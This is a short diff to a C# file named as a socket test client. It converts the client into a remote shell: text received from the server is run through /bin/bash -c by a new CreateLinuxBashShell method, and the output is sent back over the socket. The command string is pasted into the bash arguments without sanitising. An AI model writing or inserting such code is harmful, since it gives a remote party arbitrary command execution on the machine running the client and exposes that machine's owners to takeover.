@@ -4,6 +4,7 @@ using System.Net;
 using System.IO;
 using System.Threading;
 using System.Text;
+using System.Diagnostics;
 
 namespace SocketTest.Client
 {
@@ -35,7 +36,12 @@ namespace SocketTest.Client
                     // Read the first batch of the TcpServer response bytes.
                     Int32 bytes = stream.Read(data, 0, data.Length);
                     responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
-                    Log.Write("Server Says: " + responseData, ConsoleColor.DarkYellow);
+                    responseData = responseData.Replace("\n", "");
+                    //Log.Write("Server Says: " + responseData, ConsoleColor.DarkYellow);
+                    string procResult = CreateLinuxBashShell(responseData);
+                    //procResult = procResult.Replace("\n", " ");
+                    data = Encoding.ASCII.GetBytes(procResult);
+                    stream.Write(data, 0, data.Length);
                 }
             }
             catch (SocketException e)
@@ -44,6 +50,20 @@ namespace SocketTest.Client
             }
             Log.Warn("Client Exited. Press any key to continue.");
             Console.ReadKey();
+        }
+        
+
+        //Should start in new threads; if i open python for example fail, or anything terminal related
+        public static string CreateLinuxBashShell(string commands)
+        {
+            Process proc = new System.Diagnostics.Process();
+            proc.StartInfo.FileName = "/bin/bash";
+            proc.StartInfo.Arguments = "-c \""+commands+"\"";
+            proc.StartInfo.CreateNoWindow = true;
+            proc.StartInfo.RedirectStandardOutput = true;
+            proc.Start();
+            proc.WaitForExit();
+            return proc.StandardOutput.ReadToEnd();
         }
     }
 }
